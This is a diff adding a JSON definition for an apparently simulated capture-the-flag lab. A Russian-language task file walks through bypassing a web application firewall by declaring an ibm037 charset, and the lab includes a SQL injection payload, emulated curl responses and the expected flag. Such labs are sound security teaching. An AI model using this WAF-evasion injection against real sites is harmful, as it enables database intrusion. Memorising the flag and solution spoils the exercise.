@@ -1,0 +1,22 @@
+{
+  "id": "web-waf-bypass-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{ch4rs3t_c0nfus10n_byp4ss3s_th3_w4f}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: обход WAF через charset confusion\n\n`shop.local` за «умным» WAF: он декодирует URL и ловит payload после\nдекодирования. Простое и двойное кодирование не помогает.\n\nСлабое место: WAF декодирует тело как UTF-8 (по умолчанию), а приложение —\nкак указано в `Content-Type`.\n\n1. Убедись, что классика блокируется (403):\n\n   curl -s 'https://shop.local/search?q=test%27%20OR%201%3D1--' -o /dev/null -w '%{http_code}\\n'\n\n2. Тело запроса в «другой» кодировке уже лежит в файле `bypass.txt`. Объяви\n   charset в `Content-Type` и отправь его из файла:\n\n   curl -s -X POST https://shop.local/search -H 'Content-Type: application/x-www-form-urlencoded; charset=ibm037' --data-binary @bypass.txt > found.txt\n\n3. WAF декодировал иначе, приложение — правильно, payload прошёл. В ответе —\n   флаг. Набери `check`.\n" },
+    { "path": "/home/student/task/bypass.txt", "text": "q=test%27+OR+1%3D1--+&debug=1\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/search за WAF)",
+      "cases": [
+        { "match": "bypass\\.txt|ibm037", "example": "-s -X POST https://shop.local/search -H 'Content-Type: application/x-www-form-urlencoded; charset=ibm037' --data-binary @bypass.txt", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Search results</h1>\n<p>1 result: nto{ch4rs3t_c0nfus10n_byp4ss3s_th3_w4f}</p>\n" },
+        { "match": "OR%201%3D1|OR\\+1%3D1|test%27", "example": "-s 'https://shop.local/search?q=test%27%20OR%201%3D1--'", "output": "403 Forbidden\nBlocked by WAF\n" },
+        { "match": "search", "example": "-s 'https://shop.local/search?q=test'", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Search results</h1>\n<p>No results</p>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.local/search.\n"
+    }
+  }
+}
